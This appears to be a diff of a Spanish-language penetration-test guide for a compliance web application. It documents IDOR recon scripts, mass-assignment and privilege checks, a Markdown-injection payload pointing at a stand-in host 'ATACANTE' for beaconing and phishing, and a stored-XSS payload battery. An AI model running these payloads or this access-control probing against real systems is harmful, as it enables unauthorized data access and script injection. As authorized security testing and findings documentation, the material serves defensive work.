@@ -101,31 +101,45 @@ obtiene de forma legítima (los listados no filtran por alcance — ese es justa
 Pegá esto en la consola **logueado como `DUENO_UNIDAD`** y te deja las variables listas:
 
 ```js
-// Todas las organizaciones del sistema (H9)
+// (a) Todas las organizaciones del sistema — este listado NO filtra por alcance (H9)
 const orgs = await apiJson('GET', '/organizaciones');
 console.table(orgs.map(o => ({ id: o.id, nombre: o.nombre })));
 
-// Elegí una organización/unidad que NO sea la tuya:
-const orgAjena = orgs[0];                      // ajustá el índice según tu caso
-const unidades = await apiJson('GET', `/organizaciones/${orgAjena.id}/unidades`);
-const unidadAjena = unidades[0];               // una unidad que no administrás
+// (b) Tu identidad y alcance real
+const me = await apiJson('GET', '/auth/me');
+const miOrg = me.organizacionId, miUnidad = me.unidadOrganizativaId;
 
-// Un activo ajeno (el listado trae activos fuera de tu alcance):
+// (c) Una ORGANIZACIÓN ajena (otra distinta a la tuya) — para H1 (nivel org) y H2d
+const orgAjena = orgs.find(o => o.id !== miOrg);
+
+// (d) unidadAjena = otra unidad de TU MISMA organización (no la que administrás).
+//     Ojo: listar unidades de una organización AJENA da 403 (ese endpoint SÍ está scopeado);
+//     H1 se demuestra sobre una unidad "hermana" dentro de tu propia organización.
+const unidades = await apiJson('GET', `/organizaciones/${miOrg}/unidades`);
+const unidadAjena = unidades.find(u => u.id !== miUnidad);
+
+// (e) activoAjeno = un activo que NO está en tu unidad (si la instancia tiene uno)
 const activos = await apiJson('GET', '/seguridad/activos');
-const activoAjeno = activos.find(a => a.unidadOrganizativaId !== unidadAjena.id) || activos[0];
+const activoAjeno = activos.find(a => a.unidadOrganizativaId !== miUnidad);
 
-// Un hito de un plan de otra organización:
+// (f) hitoAjeno = un hito de un plan (H2c). El caso cross-org real necesita un hito en OTRA
+//     organización: si la instancia no lo tiene, hay que sembrarlo (ver nota abajo).
 const planes = await apiJson('GET', '/cumplimiento/planes');
 const hitos = planes.length ? await apiJson('GET', `/cumplimiento/planes/${planes[0].id}/hitos`) : [];
 const hitoAjeno = hitos[0];
 
-console.log({ orgAjena: orgAjena?.id, unidadAjena: unidadAjena?.id,
+console.log({ miOrg, miUnidad, orgAjena: orgAjena?.id, unidadAjena: unidadAjena?.id,
               activoAjeno: activoAjeno?.id, hitoAjeno: hitoAjeno?.id });
 ```
 
-A partir de acá, los ejemplos usan esas variables (`orgAjena`, `unidadAjena`, `activoAjeno`,
-`hitoAjeno`). Si preferís la terminal, copiá los IDs que imprime `console.log` y reemplazalos en
-los `curl`.
+A partir de acá, los ejemplos usan esas variables (`miOrg`, `orgAjena`, `unidadAjena`,
+`activoAjeno`, `hitoAjeno`). Si preferís la terminal, copiá los IDs que imprime `console.log`.
+
+> **Nota sobre datos.** Los IDOR sobre objetos (`activoAjeno` para H2, `hitoAjeno` en otra org
+> para H2c) necesitan que exista un objeto fuera de tu alcance. Si la instancia tiene pocos datos
+> (p. ej. un solo activo, en tu propia unidad), `activoAjeno`/`hitoAjeno` quedan `undefined`: hay
+> que **sembrar** ese objeto primero con una cuenta `ADMINISTRADOR` (o directamente en la base del
+> laboratorio). H1, H9, H10, H11 no dependen de esto.
 
 ---
 
@@ -309,13 +323,13 @@ await api('GET', `/seguridad/riesgos/${riesgoPropio.id}`);   // verificar
 escape de los exportadores neutraliza `&<>`/CRLF pero **no** la sintaxis Markdown `[]()`.
 
 ```js
-// 1. Crear una política con payload Markdown en la descripción
-await api('POST', `/cumplimiento/politicas/${orgAjena.id}`, {
+// 1. Crear una política con payload Markdown en la descripción (en TU propia organización)
+await api('POST', `/cumplimiento/politicas/${miOrg}`, {
   titulo: '[PRUEBA-RT] md', estado: 'BORRADOR', version: '1.0',
   descripcion: 'texto ![x](https://ATACANTE/beacon.png) y [link](https://ATACANTE/phish)'
 });
 // 2. Exportar el documento y observar el payload sin escapar
-await api('GET', `/exportaciones/organizaciones/${orgAjena.id}/politica-seguridad`);
+await api('GET', `/exportaciones/organizaciones/${miOrg}/politica-seguridad`);
 ```
 
 **Vulnerable:** el `![imagen](url)`/`[link](url)` viaja **íntegro** al documento exportado
@@ -334,7 +348,7 @@ payload almacenado **no** se ejecuta.
 ```js
 // 1. Plantar una batería de payloads en una política
 const xss = `[PRUEBA-RT] <script>alert('xss')</script> <img src=x onerror=alert(document.domain)> <svg onload=alert(1)>`;
-await api('POST', `/cumplimiento/politicas/${orgAjena.id}`, { titulo: xss, descripcion: xss, version: '1.0', estado: 'BORRADOR' });
+await api('POST', `/cumplimiento/politicas/${miOrg}`, { titulo: xss, descripcion: xss, version: '1.0', estado: 'BORRADOR' });
 ```
 
 2. **Verificar en el navegador:** ir a **Cumplimiento → Políticas**, abrir **F12 → Console** y la
@@ -432,8 +446,18 @@ Estas pruebas deben **fallar** (y fallan) — confirman que el problema es acota
 await api('PATCH', `/organizaciones/unidades/${unidadAjena.id}`, { nombre: 'x' }); // como LECTOR → 403 (ReadOnlyGuard)
 await api('PATCH', '/auth/usuarios/<ID_PROPIO>', { rol: 'ADMINISTRADOR' });        // como DUENO → 403 (RolesGuard)
 await api('GET',  '/seguridad/activos/<ID_ACTIVO_AJENO>');                          // detalle ajeno → 403 (alcance en GET :id)
+await api('GET',  `/organizaciones/${orgAjena.id}/unidades`);                       // unidades de OTRA org → 403 (sí scopeado)
 ```
 
-`403` en los tres: la escritura de solo-lectura, la escalada vertical de rol y la lectura de detalle
-fuera de alcance están correctamente bloqueadas. El problema es específicamente el **alcance
-horizontal** entre unidades/organizaciones (en creación/IDOR) y el **mass assignment**.
+`403` en los cuatro: la escritura de solo-lectura, la escalada vertical de rol, la lectura de
+detalle fuera de alcance y el listado de unidades de **otra organización** están correctamente
+bloqueados. Contraste importante: **`GET /organizaciones` (la lista de orgs) NO está scopeado**
+(H9), pero **`GET /organizaciones/:id/unidades` SÍ** (da 403) — por eso en el reconocimiento la
+`unidadAjena` se toma de tu propia organización, no de una ajena.
+
+> **Verificación.** Todos estos pasos se ejecutaron contra la instancia viva el 2026-11-04 y dieron
+> el resultado indicado (incluidos H3/H2d/H4b con sesiones `ADMINISTRADOR`/`RSI`). El entorno se
+> restauró al terminar: datos de prueba `[PRUEBA-RT]` eliminados y campos modificados revertidos.
+
+El problema es específicamente el **alcance horizontal** entre unidades/organizaciones (en
+creación/IDOR) y el **mass assignment**.
